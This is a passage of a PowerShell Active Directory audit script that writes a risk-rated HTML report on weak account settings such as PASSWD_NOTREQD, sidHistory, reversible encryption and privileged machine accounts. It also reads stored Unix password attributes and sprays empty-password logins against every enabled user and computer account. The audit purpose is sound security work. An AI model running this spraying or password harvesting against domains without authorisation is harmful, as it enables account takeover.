				"Active" = if(!$UnixPasswordSet.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $UnixPasswordSet.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $UnixPasswordSet.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $UnixPasswordSet.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $UnixPasswordSet.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"User Password" = $UnixPasswordSet.Password
				"Raw Password" = ($UnixPasswordSet.unixuserPassword) -join ' '
				"Last Logon" = if($UnixPasswordSet.lastlogontimestamp){Convert-LdapTimestamp -timestamp $UnixPasswordSet.lastlogontimestamp}else{""}
				"Pwd Last Set" = if($UnixPasswordSet.pwdlastset){Convert-LdapTimestamp -timestamp $UnixPasswordSet.pwdlastset}else{""}
				"SID" = GetSID-FromBytes -sidBytes $UnixPasswordSet.objectSID
				"Domain" = $AllDomain
			}
			
		}
	}

 	if ($TempUnixPasswordSet) {
		if(!$NoOutput){$TempUnixPasswordSet | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap}
		$HTMLUnixPasswordSet = $TempUnixPasswordSet | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='UnixPasswordSet'>Check if any Unix User Passwords are set</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='UnixPasswordSet'>" }
		$TempUnixPasswordSet."User Password" | ForEach-Object {
			$HTMLUnixPasswordSet = $HTMLUnixPasswordSet -replace "<td>$_</td>","<td class=`"YesStatus`">$_</td>"
		}
  		$HTMLUnixPasswordSet = $HTMLUnixPasswordSet -replace '<td>YES</td>','<td class="YesStatus">YES</td>'

    		$UnixPasswordSetTable = [PSCustomObject]@{
			"Risk Rating" = "High - Needs Immediate Attention"
			"Description" = "Checks if any user passwords are set via the attribute 'unixUserPassword'."
			"Remediation" = "Make sure this attribute does not contain a value."
		}
		
		$HTMLUnixPasswordSetTable = $UnixPasswordSetTable | ConvertTo-Html -As List -Fragment
		$HTMLUnixPasswordSetTable = "<div class='report-section' style='display:none;'>$HTMLUnixPasswordSetTable</div>"
	}
	
	#################################################################################################
    ########### Users with Password-not-required attribute set ###############
	#################################################################################################
	if($PassNotRequired -OR $AllEnum){
		Write-Host ""
		Write-Host "Users with Password-not-required attribute set" -ForegroundColor Cyan
		
		$TempEmptyPasswordUsers = foreach ($AllDomain in $AllDomains) {
			
			$EmptyPasswordUsers = @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain -AND $_.userAccountControl -band 32})
		
			foreach($EmptyPasswordUser in $EmptyPasswordUsers){
				
				[PSCustomObject]@{
					"User Name" = $EmptyPasswordUser.samaccountname
					"Enabled" = if ($EmptyPasswordUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if(!$EmptyPasswordUser.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $EmptyPasswordUser.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
					"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"Last Logon" = if($EmptyPasswordUser.lastlogontimestamp){Convert-LdapTimestamp -timestamp $EmptyPasswordUser.lastlogontimestamp}else{""}
					"Pwd Last Set" = if($EmptyPasswordUser.pwdlastset){Convert-LdapTimestamp -timestamp $EmptyPasswordUser.pwdlastset}else{""}
					"SID" = GetSID-FromBytes -sidBytes $EmptyPasswordUser.objectSID
					"Domain" = $AllDomain
				}
			}
		}
		
		$TrustAccountsExcludedSIDs = $TempTrustAccounts | Select-Object -ExpandProperty 'Object SID'
	
	 	if ($TempEmptyPasswordUsers | Where-Object {$_.Enabled -eq "True" -AND (-not ($TrustAccountsExcludedSIDs -contains $_.SID))}) {
			if(!$NoOutput){$TempEmptyPasswordUsers | Where-Object {$_.Enabled -eq "True"} | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap}
			$HTMLEmptyPasswordUsers = $TempEmptyPasswordUsers | Where-Object {$_.Enabled -eq "True"} | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='PassNotRequired'>Users with Password-not-required attribute set</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='PassNotRequired'>" }
			
			$HTMLEmptyPasswordUsers = $HTMLEmptyPasswordUsers -replace '<td>YES</td>','<td class="YesStatus">YES</td>'
	
	  		$EmptyPasswordsTable = [PSCustomObject]@{
				"Risk Rating" = "High - Needs Immediate Attention"
				"Description" = "When the PASSWD_NOTREQD attribute is set on an Active Directory user object, it indicates that the user account can be created without a password."
				"Remediation" = "Disable the Password-not-required attribute for all users in the domain."
			}
			
			$HTMLEmptyPasswordsTable = $EmptyPasswordsTable | ConvertTo-Html -As List -Fragment
			$HTMLEmptyPasswordsTable = "<div class='report-section' style='display:none;'>$HTMLEmptyPasswordsTable</div>"
		}
 	}
	
	#################################################################################################
    ########### Computers with Password-not-required attribute set ###############
	#################################################################################################

 	if($PassNotRequired -OR $AllEnum){
		Write-Host ""
		Write-Host "Computers with Password-not-required attribute set" -ForegroundColor Cyan
		
		$TempEmptyPasswordComputers = foreach ($AllDomain in $AllDomains) {
			#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
			
			$EmptyPasswordComputers = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain} | Where-Object {$_.userAccountControl -band 32})
		
			foreach($EmptyPasswordComp in $EmptyPasswordComputers){
				
				if($EmptyPasswordComp.DnsHostName){$IPAddress = (Resolve-DnsName -Name $EmptyPasswordComp.DnsHostName -Type A).IPAddress}
				if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
				
				[PSCustomObject]@{
					"Computer Name" = $EmptyPasswordComp.samaccountname
					"Enabled" = if ($EmptyPasswordComp.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if(!$EmptyPasswordComp.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $EmptyPasswordComp.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = $IPAddress
					"Operating System" = $EmptyPasswordComp.operatingsystem
					"SID" = GetSID-FromBytes -sidBytes $EmptyPasswordComp.objectSID
					"Domain" = $AllDomain
				}
				$IPAddress = $null	
			}
		}
	
	 	if ($TempEmptyPasswordComputers | Where-Object {$_.Enabled -eq "True"}) {
			if(!$NoOutput){$TempEmptyPasswordComputers | Where-Object {$_.Enabled -eq "True"} | Sort-Object Domain,"Computer Name" | Format-Table -AutoSize -Wrap}
			$HTMLEmptyPasswordComputers = $TempEmptyPasswordComputers | Where-Object {$_.Enabled -eq "True"} | Sort-Object Domain,"Computer Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='CompPassNotRequired'>Computers with Password-not-required attribute set</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='CompPassNotRequired'>" }
			
			$HTMLEmptyPasswordComputers = $HTMLEmptyPasswordComputers -replace '<td>YES</td>','<td class="YesStatus">YES</td>'
	
	  		$EmptyPasswordsCompTable = [PSCustomObject]@{
				"Risk Rating" = "High - Needs Immediate Attention"
				"Description" = "When the PASSWD_NOTREQD attribute is set on an Active Directory computer object, it indicates that the computer account can be created without a password."
				"Remediation" = "Disable the Password-not-required attribute for all computers in the domain."
			}
			
			$HTMLEmptyPasswordComputersTable = $EmptyPasswordsCompTable | ConvertTo-Html -As List -Fragment
			$HTMLEmptyPasswordComputersTable = "<div class='report-section' style='display:none;'>$HTMLEmptyPasswordComputersTable</div>"
		}
 	}

	#################################################################################################
    ########### Accounts with Empty Passwords ###############
	#################################################################################################
	
	if($SprayEmptyPasswords -OR $AllEnum){
 
	 	Write-Host ""
		Write-Host "User Accounts with empty passwords" -ForegroundColor Cyan
		
		$minDelay = 0
		$maxDelay = 200
		$delay = Get-Random -Minimum $minDelay -Maximum $maxDelay
		
		$TempTotalEmptyPass = foreach ($AllDomain in $AllDomains) {
				
			$PotentialUsersWithEmptyPassword = @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain} | Sort-Object samaccountname)
			$TotalPotentialEmptyPass = New-Object System.Collections.ArrayList
			$null = $TotalPotentialEmptyPass.AddRange($PotentialUsersWithEmptyPassword)
			
			Add-Type -AssemblyName "System.DirectoryServices.AccountManagement"
			$EmptyServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
			$principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $EmptyServer, $AllDomain)
		
			foreach($EmptyPasswordUser in $TotalPotentialEmptyPass){
			
				$EmptyPasswordUserName = $EmptyPasswordUser.samaccountname
				
				$EmptyCheck = $principalContext.ValidateCredentials("$EmptyPasswordUserName", "", 1)
				
				if ($EmptyCheck){
					$EmptySIDUserName = GetSID-FromBytes -sidBytes $EmptyPasswordUser.objectSID
					[PSCustomObject]@{
						"User Name" = $EmptyPasswordUser.samaccountname
						"Enabled" = if ($EmptyPasswordUser.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if(!$EmptyPasswordUser.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $EmptyPasswordUser.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
						"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"Last Logon" = if($EmptyPasswordUser.lastlogontimestamp){Convert-LdapTimestamp -timestamp $EmptyPasswordUser.lastlogontimestamp}else{""}
						"Pwd Last Set" = if($EmptyPasswordUser.pwdlastset){Convert-LdapTimestamp -timestamp $EmptyPasswordUser.pwdlastset}else{""}
						"SID" = $EmptySIDUserName
						"Domain" = $AllDomain
					}
				}	
			}
		}
	
	 	if ($TempTotalEmptyPass) {
			if(!$NoOutput){$TempTotalEmptyPass | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap}
			$HTMLTotalEmptyPass = $TempTotalEmptyPass | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='EmptyPasswordUsers'>User Accounts with empty passwords</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='EmptyPasswordUsers'>" }
			
			$HTMLTotalEmptyPass = $HTMLTotalEmptyPass -replace '<td>YES</td>','<td class="YesStatus">YES</td>'
	
	  		$TotalEmptyPassTable = [PSCustomObject]@{
				"Risk Rating" = "High - Needs Immediate Attention"
				"Description" = "Empty passwords can be set when password policies allow it or the Password-not-required attribute is enabled. These accounts are extremely easy for an attacker to compromise."
				"Remediation" = "Enforce strong password policies and ensure that all user accounts have a secure and non-empty password."
			}
			
			$HTMLTotalEmptyPassTable = $TotalEmptyPassTable | ConvertTo-Html -As List -Fragment
			$HTMLTotalEmptyPassTable = "<div class='report-section' style='display:none;'>$HTMLTotalEmptyPassTable</div>"
		}

 	}
	
	#################################################################################################
    ########### Computer Accounts with Empty Passwords ###############
	#################################################################################################
	
	if($SprayEmptyPasswords -OR $AllEnum){
 
	 	Write-Host ""
		Write-Host "Computer Accounts with empty passwords" -ForegroundColor Cyan
		
		$minDelay = 0
		$maxDelay = 200
		$delay = Get-Random -Minimum $minDelay -Maximum $maxDelay
		
		$TempTotalCompEmptyPass = foreach ($AllDomain in $AllDomains) {
				
			$PotentialComputersWithEmptyPassword = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain} | Sort-Object samaccountname)
			$TotalPotentialEmptyPass = New-Object System.Collections.ArrayList
			$null = $TotalPotentialEmptyPass.AddRange($PotentialComputersWithEmptyPassword)
			#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
			Add-Type -AssemblyName "System.DirectoryServices.AccountManagement"
			$EmptyServer = $RIDRoleDCs | Where-Object {$_.Domain -eq $AllDomain} | Select-Object -ExpandProperty Name
			$principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $EmptyServer, $AllDomain)
		
			foreach($EmptyPasswordComp in $TotalPotentialEmptyPass){
			
				$EmptyPasswordCompName = $EmptyPasswordComp.samaccountname
				
				$EmptyCheck = $principalContext.ValidateCredentials("$EmptyPasswordCompName", "", 1)
				
				if ($EmptyCheck){
					if($EmptyPasswordComp.dnshostname){$IPAddress = (Resolve-DnsName -Name $EmptyPasswordComp.dnshostname -Type A).IPAddress}
					if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
     					$EmptySIDCompName = GetSID-FromBytes -sidBytes $EmptyPasswordComp.objectSID
					
					[PSCustomObject]@{
						"Name" = $EmptyPasswordComp.samaccountname
						"Enabled" = if ($EmptyPasswordComp.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if(!$EmptyPasswordComp.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $EmptyPasswordComp.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
						"IP Address" = $IPAddress
						"Operating System" = $EmptyPasswordComp.operatingsystem
						"SID" = $EmptySIDCompName
						"Domain" = $AllDomain
					}
					
					$IPAddress = $null
				}
				
			}
			
		}
	
	 	if ($TempTotalCompEmptyPass) {
			if(!$NoOutput){$TempTotalCompEmptyPass | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap}
			$HTMLCompTotalEmptyPass = $TempTotalCompEmptyPass | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='EmptyPasswordComp'>Computer Accounts with empty passwords</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='EmptyPasswordComp'>" }
			
			$HTMLCompTotalEmptyPass = $HTMLCompTotalEmptyPass -replace '<td>YES</td>','<td class="YesStatus">YES</td>'
	
	  		$TotalCompEmptyPassTable = [PSCustomObject]@{
				"Risk Rating" = "High - Needs Immediate Attention"
				"Description" = "Empty passwords can be set when password policies allow it or the Password-not-required attribute is enabled. These accounts are extremely easy for an attacker to compromise."
				"Remediation" = "Enforce strong password policies and ensure that all computer accounts have a secure and non-empty password."
			}
			
			$HTMLCompTotalEmptyPassTable = $TotalCompEmptyPassTable | ConvertTo-Html -As List -Fragment
			$HTMLCompTotalEmptyPassTable = "<div class='report-section' style='display:none;'>$HTMLCompTotalEmptyPassTable</div>"
		}

 	}
	
	############################################
    ########### Pre-Windows 2000 ###############
	############################################
	
	
	Write-Host ""
	Write-Host "Members of Pre-Windows 2000 Compatible Access group" -ForegroundColor Cyan
	$TempPreWin2kCompatibleAccess = foreach ($AllDomain in $AllDomains) {
		#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
		
		$PreWin2kCompatibleAccessMembers = @(RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Domain $AllDomain -Raw -Identity "Pre-Windows 2000 Compatible Access")
		foreach ($Member in $PreWin2kCompatibleAccessMembers) {
			$memberName = $Member.samaccountname
			
			if($Member.DnsHostName){$ipAddress = Resolve-DnsName -Name $Member.DnsHostName -Type A | Select-Object -ExpandProperty IPAddress}
			if($ipAddress.count -gt 1){$ipAddress = $ipAddress -join ", "}
			
			[PSCustomObject]@{
				"Member" = $Member.samaccountname
				"Enabled" = if ($Member.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if(!$Member.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $Member.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				"IP Address" = $ipAddress
				"Operating System" = $Member.operatingsystem
				"Member SID" = GetSID-FromBytes -sidBytes $Member.objectsid
				"Domain" = $AllDomain
			}
			$ipAddress = $null
		}
	}

 	if ($TempPreWin2kCompatibleAccess) {
		if(!$NoOutput){$TempPreWin2kCompatibleAccess | Sort-Object Domain,Member | Format-Table -AutoSize -Wrap}
		$HTMLPreWin2kCompatibleAccess = $TempPreWin2kCompatibleAccess | Sort-Object Domain,Member | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='PreWin2kCompatibleAccess'>Members of Pre-Windows 2000 Compatible Access group</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='PreWin2kCompatibleAccess'>" }

  		$PreWindows2000Table = [PSCustomObject]@{
			"Description" = "Pre-Windows 2000 computer objects used to get assigned a password based on the computer name instead of a random one. This can be leveraged to gain a foothold or to compromise your domain."
			"Remediation" = "Avoid creating legacy compatible computer accounts. Make sure trust and computer password rotation are working properly. Get rid of legacy computer accounts that have not been active for a long time."
		}
		
		$HTMLPreWindows2000Table = $PreWindows2000Table | ConvertTo-Html -As List -Fragment
		$HTMLPreWindows2000Table = "<div class='report-section' style='display:none;'>$HTMLPreWindows2000Table</div>"
	}
	
	########################################################################################
    ########### Windows 7 and Server 2008 Machines (Windows Remoting Enabled) ###############
	########################################################################################
	
	Write-Host ""
	Write-Host "Windows 7 and Server 2008 Machines (Windows Remoting Enabled)" -ForegroundColor Cyan
	$TempWin7AndServer2008 = foreach ($AllDomain in $AllDomains) {
		#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
		$WinRMComputers = @($TotalEnabledMachines | Where-Object { $_.domain -eq $AllDomain -AND ($_.operatingsystem -like "*7*" -OR  $_.operatingsystem -like "*2008*") -AND $_.serviceprincipalname -like "wsman*" })
		foreach ($Computer in $WinRMComputers) {
			if($Computer.DnsHostName){$ipAddress = (Resolve-DnsName -Name $Computer.DnsHostName -Type A).IPAddress}
			if($ipAddress.count -gt 1){$ipAddress = $ipAddress -join ", "}
			[PSCustomObject]@{
				"Name" = $Computer.samaccountname
				"Enabled" = if ($Computer.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if(!$Computer.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $Computer.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				"IP Address" = $ipAddress
				"Operating System" = $Computer.operatingsystem
				"Account SID" = GetSID-FromBytes -sidBytes $Computer.objectsid
				"Domain" = $AllDomain
			}
			$ipAddress = $null
		}
	}

	if ($TempWin7AndServer2008) {
		if(!$NoOutput){$TempWin7AndServer2008 | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap}
		$HTMLWin7AndServer2008 = $TempWin7AndServer2008 | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='Win7AndServer2008'>Windows 7 and Server 2008 Machines (Windows Remoting Enabled)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='Win7AndServer2008'>" }
	}
	
	####################################################################
    ########### Machine Accounts in Privileged Groups ##################
	####################################################################
	
	Write-Host ""
    Write-Host "Machine accounts in privileged groups" -ForegroundColor Cyan
    $TempMachineAccountsPriv = foreach ($AllDomain in $AllDomains) {
		#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
		
		$PrivilegedGroups = @($TotalGroups | Where-Object {$_.domain -eq $AllDomain -AND $_.admincount -eq 1})
		$MachinePrivGroupMembers = @()
		$MachinePrivGroupMembers = foreach($PrivilegedGroup in $PrivilegedGroups){RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity $PrivilegedGroup.samaccountname | Where-Object {$_.samaccountname -like "*$" | Sort-Object -Unique domain,samaccountname}}
		
		foreach ($GroupMember in $MachinePrivGroupMembers) {
			$TempTargetGroups = @($GroupMember | Select-Object -ExpandProperty memberof)
			$TargetGroups = @()
			foreach($TempTargetGroup in $TempTargetGroups){
				$TempTargetGroupName = ($TempTargetGroup -split ",")[0]
				$TargetGroupName = $TempTargetGroupName -replace "CN=",""
				$dcComponents = @()
				$TempTargetGroupDomain = $TempTargetGroup -split ","
				foreach($component in $TempTargetGroupDomain){
					if ($component -like "DC=*") {
						$dcComponents += $component.Substring(3)
					}
				}
				$TargetGroupDomain = $dcComponents -join "."
				if($PrivilegedGroups.samaccountname -contains $TargetGroupName){
					$TargetGroups += [PSCustomObject]@{
						GroupName = $TargetGroupName
						GroupDomain = $TargetGroupDomain
					}
				}
			}
			#$DomainComputerGroupMember = $TotalAllMachines | Where-Object {$_.domain -eq $AllDomain} | Where-Object {$_.name -eq $GroupMember.MemberName.TrimEnd('$')}
			if($GroupMember.DnsHostName){$ipAddress = Resolve-DnsName -Name $GroupMember.DnsHostName -Type A | Select-Object -ExpandProperty IPAddress}
			if($ipAddress.count -gt 1){$ipAddress = $ipAddress -join ", "}
			$Targetsid = GetSID-FromBytes -sidBytes $GroupMember.objectsid
			$TargetTimestamp = Convert-LdapTimestamp -timestamp $GroupMember.lastlogontimestamp
			foreach($TargetGroup in $TargetGroups){
				[PSCustomObject]@{
					"Member" = $GroupMember.samaccountname
					"Enabled" = if ($GroupMember.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if(!$GroupMember.lastlogontimestamp){""} elseif ($TargetTimestamp -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = $ipAddress
					"Operating System" = $GroupMember.operatingsystem
					"Member SID" = $Targetsid
					"Member Domain" = $GroupMember.domain
					"Privileged Group" = $TargetGroup.GroupName
					"Group Domain" = $TargetGroup.GroupDomain
				}
			}
			$ipAddress = $null
		}
	}

 	if ($TempMachineAccountsPriv) {
		if(!$NoOutput){$TempMachineAccountsPriv | Sort-Object "Group Domain",Member | Format-Table -AutoSize -Wrap}
		$HTMLMachineAccountsPriv = $TempMachineAccountsPriv | Sort-Object "Group Domain",Member | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='MachineAccountsPriv'>Machine accounts in privileged groups</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='MachineAccountsPriv'>" }

  		$MachineAccountsPrivilegedGroupsTable = [PSCustomObject]@{
			"Recommendations" = "Evaluate the necessity of the identified computer objects' membership in the privileged group and consider removing them if their inclusion is not essential for their intended purpose."
		}
		
		$HTMLMachineAccountsPrivilegedGroupsTable = $MachineAccountsPrivilegedGroupsTable | ConvertTo-Html -As List -Fragment
  		$HTMLMachineAccountsPrivilegedGroupsTable = $HTMLMachineAccountsPrivilegedGroupsTable.Replace("*", "Recommendations")
		$HTMLMachineAccountsPrivilegedGroupsTable = "<div class='report-section' style='display:none;'>$HTMLMachineAccountsPrivilegedGroupsTable</div>"
	}
	
	##########################################
    ########### sidHistory set ###############
	##########################################

    Write-Host ""
	Write-Host "Users with sidHistory set" -ForegroundColor Cyan
	$TempsidHistoryUsers = foreach ($AllDomain in $AllDomains) {
		
		$sidHistoryUsers = $TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain -AND $_.sidHistory}
		foreach ($sidHistoryUser in $sidHistoryUsers) {
			[PSCustomObject]@{
				"User Name" = $sidHistoryUser.samaccountname
				"Enabled" = if ($sidHistoryUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if(!$sidHistoryUser.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $sidHistoryUser.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $sidHistoryUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $sidHistoryUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $sidHistoryUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"Last Logon" = if($sidHistoryUser.lastlogontimestamp){Convert-LdapTimestamp -timestamp $sidHistoryUser.lastlogontimestamp}else{""}
				"Pwd Last Set" = if($sidHistoryUser.pwdlastset){Convert-LdapTimestamp -timestamp $sidHistoryUser.pwdlastset}else{""}
				"SID" = GetSID-FromBytes -sidBytes $sidHistoryUser.objectSID
				"Domain" = $AllDomain
			}
		}
	}

 	if ($TempsidHistoryUsers) {
		if(!$NoOutput){$TempsidHistoryUsers | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap}
		$HTMLsidHistoryUsers = $TempsidHistoryUsers | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='sidHistoryUsers'>Users with sidHistory set</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='sidHistoryUsers'>" }

  		$SDIHistorysetTable = [PSCustomObject]@{
			"Recommendations" = "Assess if there are valid reasons for the identified accounts to have the 'sidHistory' attribute set, and consider removing it to mitigate potential security risks."
		}
		
		$HTMLSDIHistorysetTable = $SDIHistorysetTable | ConvertTo-Html -As List -Fragment
  		$HTMLSDIHistorysetTable = $HTMLSDIHistorysetTable.Replace("*", "Recommendations")
		$HTMLSDIHistorysetTable = "<div class='report-section' style='display:none;'>$HTMLSDIHistorysetTable</div>"
  		
	}
	
	##################################################
    ########### Reversible Encryption ################
	##################################################
	
	Write-Host ""
	Write-Host "Users with Reversible Encryption" -ForegroundColor Cyan

	$TempRevEncUsers = foreach ($AllDomain in $AllDomains) {
		$RevEncUsers = @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain} | Where-Object {if ($null -ne $_.userAccountControl) {$uacValue = [int]$_.userAccountControl;$binaryUAC = [convert]::ToString($uacValue, 2).PadLeft(32, '0');$binaryUAC[-8] -eq '1'}})
		foreach ($RevEncUser in $RevEncUsers) {
			[PSCustomObject]@{
				"Name" = $RevEncUser.samaccountname
				"Enabled" = if ($RevEncUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if(!$RevEncUser.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $RevEncUser.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $RevEncUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $RevEncUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $RevEncUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"Last Logon" = if($RevEncUser.lastlogontimestamp){Convert-LdapTimestamp -timestamp $RevEncUser.lastlogontimestamp}else{""}
				"Pwd Last Set" = if($RevEncUser.pwdlastset){Convert-LdapTimestamp -timestamp $RevEncUser.pwdlastset}else{""}
				"Object SID" = GetSID-FromBytes -sidBytes $RevEncUser.objectsid
				"Domain" = $AllDomain
			}
		}
	}

 	if ($TempRevEncUsers | Where-Object {$_.Name -ne $null}) {
		if(!$NoOutput){$TempRevEncUsers | Where-Object {$_.Name -ne $null} | Sort-Object Domain,Name | Format-Table -AutoSize}
		$HTMLRevEncUsers = $TempRevEncUsers | Where-Object {$_.Name -ne $null} | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='RevEncUsers'>Users with Reversible Encryption</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='RevEncUsers'>" }

  		$ReversibleEncryptionTable = [PSCustomObject]@{
			"Recommendations" = "Review and disable Reversible Encryption for every account identified, then force a password change to ensure that passwords are securely hashed."
